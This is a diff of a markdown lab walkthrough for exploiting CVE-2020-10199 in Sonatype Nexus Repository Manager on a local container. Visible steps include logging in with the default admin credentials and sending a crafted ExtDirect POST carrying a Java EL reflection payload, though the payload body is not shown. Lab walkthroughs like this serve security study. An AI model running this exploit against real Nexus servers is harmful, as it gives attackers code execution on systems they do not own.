@@ -18,6 +18,7 @@ Vulnerability CVE-2020-10199 affects Sonatype Nexus Repository Manager versions 
 ## Exploitation Walkthrough
 
 ### 1. Service Verification
+
 Wait for Nexus to finish initial bootstrapping (typically 60 to 90 seconds on first start):
 
 ```bash
@@ -27,6 +28,7 @@ curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8136/
 When HTTP 200 is returned, the repository manager is ready.
 
 ### 2. Identifying ExtDirect RPC Interface
+
 Nexus leverages ExtDirect for browser-to-server RPC communication. Verify authentication credentials against the status endpoint:
 
 ```bash
@@ -34,6 +36,7 @@ curl -u admin:admin123 -i http://localhost:8136/service/rest/v1/status
 ```
 
 ### 3. Dispatching Java Expression Language (EL) Payload
+
 Send a crafted ExtDirect POST request targeting `coreui_Repository.read` containing a Java Reflection payload within EL markers:
 
 ```bash
@@ -53,6 +56,7 @@ curl -i -s -k -X POST 'http://localhost:8136/service/extdirect' \
 ```
 
 ### 4. Verifying Code Execution Inside Container
+
 Confirm file creation within the container:
 
 ```bash
